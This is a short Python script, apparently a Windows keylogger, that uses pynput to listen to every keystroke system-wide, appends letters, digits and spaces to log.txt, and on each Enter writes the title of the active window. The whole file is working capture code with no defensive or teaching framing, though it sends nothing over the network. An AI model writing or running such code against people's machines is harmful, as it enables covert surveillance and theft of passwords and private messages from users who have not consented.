from pynput.keyboard import Key, Listener
import win32gui

numbers = [str(i) for i in range(10)]
small_letters = [chr(i) for i in range(ord('a'), ord('z') + 1)]
capital_letters = [chr(i) for i in range(ord('A'), ord('Z') + 1)]

complete_alphabet = numbers + small_letters + capital_letters
alphabet = []

for letter in complete_alphabet:
    letter = letter.replace("'", "")
    alphabet.append(letter)


def on_press(key):
    hwnd = win32gui.GetForegroundWindow()
    win_title = win32gui.GetWindowText(hwnd)

    key = str(key).replace("'", "")

    if key in alphabet:
        with open('log.txt', 'a') as f:
            f.write(key)
    elif key == "Key.backspace":
        with open('log.txt', 'r+') as f:
            f.seek(0, 2)
            f.seek(f.tell() - 1, 0)
            f.truncate()
    elif key == "Key.space":
        with open('log.txt', 'a') as f:
            f.write(" ")
    elif key == "Key.enter":
        with open('log.txt', 'a') as f:
            f.write("\n" + key + "     " + win_title + "\n\n")
    else:
        pass


if __name__ == '__main__':
    with Listener(on_press=on_press) as listener:
        listener.join()